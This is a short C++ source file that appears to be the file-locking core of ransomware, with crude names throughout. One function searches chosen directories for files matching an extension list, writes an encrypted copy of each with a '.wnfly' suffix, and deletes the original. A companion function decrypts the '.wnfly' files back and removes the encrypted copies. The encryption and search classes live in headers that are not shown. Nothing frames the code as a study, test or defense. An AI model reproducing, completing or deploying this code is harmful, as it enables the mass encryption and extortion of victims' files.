#include "encrptyFile.h"
#include "SearchFile.h"
//#include <windows.h>
void fuckFiles(list<string> baseFilepath,list<string> fliter,encrptyFile fuck)
{

    list<string> needTofuck;
    SearchFile findFile(baseFilepath, fliter);

    findFile.toSearchFilePath();
    needTofuck = findFile.getAllFilePath();
    for (string each : needTofuck){
        fuck.encryptFile(each, each + ".wnfly");
        remove(each.c_str());
    }
}
void reFiles(list<string> baseFilepath, encrptyFile fuck)
{

    list<string> needTofuck;
    list<string>fliter;
    fliter.push_back("wnfly");
    SearchFile findFile(baseFilepath, fliter);

    findFile.toSearchFilePath();
    needTofuck = findFile.getAllFilePath();
    for (string each : needTofuck) {
        fuck.decryptFile(each, each.substr(0,each.find_last_of(".")));
        remove(each.c_str());
    }
}